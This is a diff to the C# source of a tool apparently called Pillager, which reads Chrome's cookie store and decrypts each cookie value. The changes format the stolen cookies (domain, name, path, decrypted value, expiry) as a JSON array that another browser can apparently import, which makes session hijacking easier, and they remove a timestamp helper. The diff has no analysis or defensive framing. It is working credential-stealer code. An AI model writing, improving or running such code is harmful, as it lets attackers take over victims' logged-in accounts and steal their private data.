@@ -202,13 +202,13 @@ namespace Pillager.Browsers
                         string cookie = Encoding.UTF8.GetString(DecryptData(Convert.FromBase64String(crypt)));
                         cookies.AppendLine("{");
                         cookies.AppendLine("    \"domain\": \"" + host_key + "\",");
-                        cookies.AppendLine("    \"expirationDate\": \"" + expDateDouble + "\",");
+                        cookies.AppendLine("    \"expirationDate\": " + expDateDouble + ",");
                         cookies.AppendLine("    \"hostOnly\": false,");
                         cookies.AppendLine("    \"name\": \"" + name + "\",");
                         cookies.AppendLine("    \"path\": \"" + path + "\",");
                         cookies.AppendLine("    \"session\": true,");
-                        cookies.AppendLine("    \"storeId\": \"0\",");
-                        cookies.AppendLine("    \"value\": \"" + cookie + "\"");
+                        cookies.AppendLine("    \"storeId\": null,");
+                        cookies.AppendLine("    \"value\": \"" + cookie.Replace("\"", "\\\"") + "\"");
                         cookies.AppendLine("},");
                     }
                     File.Delete(cookie_tempFile);
@@ -217,24 +217,10 @@ namespace Pillager.Browsers
             }
             if (cookies.Length > 0)
             {
-                return "[" + cookies.ToString() + "]";
+                string temp = cookies.ToString();
+                return "[" + temp.Substring(0, temp.Length - 3) + "]";
             }
             return cookies.ToString();
-        }
-
-        public static DateTime TimeEpoch(long epoch)
-        {
-            var maxTime = 99633311740000000L;
-
-            if (epoch > maxTime)
-            {
-                return new DateTime(2049, 1, 1, 1, 1, 1, DateTimeKind.Local);
-            }
-
-            var epochTicks = epoch * 10; // Convert to ticks
-            var epochDateTime = new DateTime(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc).AddTicks(epochTicks).ToLocalTime();
-
-            return epochDateTime;
         }
 
         public static string Chrome_books()
